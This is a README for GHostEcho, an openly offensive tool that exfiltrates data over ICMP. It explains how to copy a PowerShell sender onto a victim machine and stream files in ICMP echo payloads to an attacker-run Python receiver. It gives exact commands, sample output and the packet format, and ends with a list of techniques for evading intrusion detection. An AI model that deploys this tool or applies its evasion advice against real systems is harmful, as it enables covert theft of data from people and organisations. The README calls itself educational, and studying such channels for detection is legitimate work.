# GHostEcho

GHostEcho is a stealthy and easy-to-use data exfiltrator over ICMP echo requests by splitting files into chunks and embedding each chunk into an ICMP packet payload. It is inspired by [dahvidschloss/PILOT](https://github.com/dahvidschloss/PILOT). The goal is educational: to demonstrate a constrained, transport-layer-like file transfer using ICMP, including basic integrity checking using CRC32.

The sender is written in PowerShell (works on Windows PowerShell and PowerShell Core).
The receiver is written in Python 3 (standard library only).

## Features

* Stream a file chunk-by-chunk (no full-file buffering) from sender → receiver.
* CRC32 per-chunk integrity check (sender computes, receiver validates).
* Simple metadata packet (filename, filesize, total chunks, chunk size).
* Best-effort transfer (current default: no retransmit/ACK logic). Receiver sends ACK/NAK but sender provided here is best-effort; a reliable mode variant exists elsewhere.
* Inline console progress updates that overwrite the same line (works in standard terminal; IDE consoles may differ).
* Small footprint and no external dependencies (Python receiver uses stdlib only).

## Requirements

* Sender (PowerShell):
  - Windows PowerShell (tested on PS 5.1).
  - Run as unprivileged user.
* Receiver (Python):
  - Python 3.6+ (tested on Python 3.13)
  - No external libraries required (uses socket, struct, binascii, tempfile).
  - Run as root (raw sockets).
* Both systems should be able to exchange ICMP (no network-level blocking).

## Installation

Just clone the repository:
```
git clone https://github.com/D3vil0p3r/GHostEcho.git
cd GHostEcho
```
No build steps required.

## Usage

### Sender
Copy **GHostEcho-Sender.ps1** to the victim machine where you want to exfiltrate data from, open PowerShell and run:
```powershell
.\GHostEcho-Sender.ps1 -TargetIP "192.168.56.101" -FilePath ".\document.pdf" -ChunkSize 1200
```
or import it as a module:
```powershell
. .\GHostEcho-Sender.ps1
```
and use its function:
```powershell
Send-GHostEcho -TargetIP "192.168.56.101" -FilePath ".\document.pdf" -ChunkSize 1200
```
Options:
* `-TargetIP` - destination IP (receiver).
* `-FilePath` - path to file to send (relative to script or absolute).
* `-ChunkSize` - number of bytes per chunk (default recommended: 1200).
* `-DelayMs` - optional inter-chunk delay in ms.
* `-TimeoutMs` - ping timeout in ms.
* `-ProbeCount` - number of short pings to send before the transfer to measure round-trip time (RTT).

Notes:
* `-ChunkSize` refers to file bytes per ICMP packet payload (before adding seq/checksum overhead).
* Defaults are conservative to avoid IP fragmentation.

The sender output appears like:
```
Preparing to send 'OMG_THIS_NIST_PUBLICATION_IS_SO_SECRET_I_LIKE_TO_EXFILTRATE_CMON.pdf' (6073678 bytes) to 192.168.56.101 in 5062 chunks (chunk size 1200 bytes)

Estimated total time: 4m 18s — per-packet ≈ 51 ms (avg RTT 51 ms; DelayMs 0 ms). RTT source: measured (avg of 4/4 probes)
Lower bound (network delay ignored): 0s

Starting transfer...
Metadata sent.
Sent chunk 5061/5062 seq 5060 - 6,073,200/6,073,678 bytes
Done. Sent 6073678 bytes in 5062 chunks.
```

### Receiver
Copy **GHostEcho-Receiver.py** to the attacker machine where you want to receive the exfiltrated data, open the terminal and run:
```bash
sudo python3 GHostEcho-Receiver.py
```
Receiver behavior:
* Listens for ICMP Echo Requests.
* Recognizes the first metadata packet (starts with FileName:), replies META|OK.
* For each chunk packet, verifies CRC32 and replies ACK|<seq> or NAK|<seq>.
* Stores chunk data into temporary files (memory-friendly) and assembles the file once all chunks are received.

The receiver output appears like:
```
[*] Listening for ICMP Echo Requests (requires root). Press Ctrl-C to stop.
[META] From 84.227.35.65: filename=OMG_THIS_NIST_PUBLICATION_IS_SO_SECRET_I_LIKE_TO_EXFILTRATE_CMON.pdf, filesize=6073678, total_chunks=5062, chunk_size=1200
[+] Received 5054/5062 chunks
[+] All chunks received; assembling OMG_THIS_NIST_PUBLICATION_IS_SO_SECRET_I_LIKE_TO_EXFILTRATE_CMON.pdf ...
[+] Wrote OMG_THIS_NIST_PUBLICATION_IS_SO_SECRET_I_LIKE_TO_EXFILTRATE_CMON.pdf
```

### Protocol / Packet format

This describes the exact payloads exchanged (sender → receiver).

#### Metadata packet (ASCII)

```
FileName:<filename>
FileSize:<bytes>
TotalChunks:<n>
ChunkSize:<bytes>
```
The sender caps the metadata payload (for safety); the receiver tolerates missing fields and case differences.

#### Chunk packet (binary layout - little endian)

The file chunk is stored inside the ICMP data (a.k.a. ICMP payload) and it is structured like:
```python
[ 4 bytes ] sequence number (uint32 little-endian)
[ 1 byte  ] delimiter '|'
[ N bytes ] checksum (ASCII hex of CRC32 e.g. "cbf43926")
[ 1 byte  ] delimiter '|'
[ M bytes ] chunk payload (raw file bytes)     <-- length = ChunkSize for all but last chunk
```
Example: `[00 00 00 00] | "cbf43926" | <payload bytes>`

Notes
* Sequence numbers start at `0` for the first chunk.
* Receiver computes CRC using `binascii.crc32(chunk) & 0xffffffff` and compares to hex integer parsed from checksum ASCII.
* Sender adds the two `|` delimiters as byte `0x7C`.

### Design notes, tuning & performance

* Chunk size guidance
  - Recommended default: 1200 bytes (safe vs typical MTU 1500; avoids fragmentation).
  - Ethernet MTU (1500) minus IPv4 and ICMP header overhead leaves ~1472 bytes of payload; use ~1400 at your own risk.
  - VPNs, PPPoE, tunnels often have lower effective MTU --> keep chunk sizes smaller in those environments.
* Throughput tradeoffs
  - Larger ChunkSize → higher throughput, fewer packets, but more chance of fragmentation & loss.
  - Smaller ChunkSize → more packets, higher overhead.
  - For lab testing, start with 1200 and experiment.
* Delay
  - Use -DelayMs if you suspect NIC/host overload or to avoid bursts triggering IDS.
* Inline progress
  - Sender & receiver print a single-line, in-place updated progress display in standard terminals. Some IDE consoles (PowerShell ISE, VSCode debug console) may not support cursor positioning and it falls back to alternative displays there.
 
### Reliability & limitations

* Best-effort by default: the provided sender in this repository does not implement retransmit/ACK waiting; it is a streaming best-effort sender. The receiver sends ACK/NAK, but sender proceeds regardless.
* Packet loss: ICMP is not reliable. Lost packets result in missing file data unless retransmit logic is implemented.
* Sequence numbers: 32-bit sequence numbers are used (plenty for practical file sizes), but current receiver expects contiguous sequences starting at 0 for reassembly.
* Security/Detection: Likely to trigger network IDS / endpoint telemetry; do not use on production or networks without permission.
* Permissions: receiver needs root.

### Evasion

To decrease detectability by security technologies (i.e., network IDS) and improve stealthiness, it is possible to implement the following evasion techniques:
* Content obfuscation - hide recognizable plaintext (e.g., filenames, protocol markers) by encoding/encrypting payloads so signature rules fail.
* Mimicry / blending - make malicious traffic look like common benign ICMP uses (matching timing, sizes, or destinations).
* Throughput / throttling - move data very slowly (low-and-slow) or burst in ways to avoid threshold rules.
* Size manipulation / fragmentation - use fragmenting or variable payload sizes to avoid fixed-size detectors or to hide structure across fragments.
* Timing randomization - add jitter or variable inter-packet delays to defeat timing/periodicity detectors.
* Protocol tunneling / multiplexing - combine or shift to other protocols to use allowed channels; here we focus on ICMP contextually.
* Polymorphism / variability - change observable characteristics per transfer (e.g., chunk size, delimiter patterns) to defeat static behavioral rules.
* Encryption / high entropy - payloads look random, reducing content-based detection (but usually increase entropy signals and, consequently, detection).

### Development notes

* Reliable mode: A reliable sender variant was prototyped earlier (ACK/NAK + retransmit up to MaxRetries). That version waits for ACKs; you can incorporate it if you need reliability.
* Receiver storage: Current receiver stores each chunk as a temporary file to avoid huge memory usage; for fast transfers you can switch to a memory map or direct writes if you trust available RAM.
* Possible improvements
  - Bitmap batch-ACK (receiver periodically informs which chunks it has so sender can retransmit missing ranges).
  - Pipelined in-flight windows (send many chunks, then retransmit missing).
  - Further evasion techniques.
  - Optional encryption/authentication of content.
  - Optional compression for better throughput on compressible files.
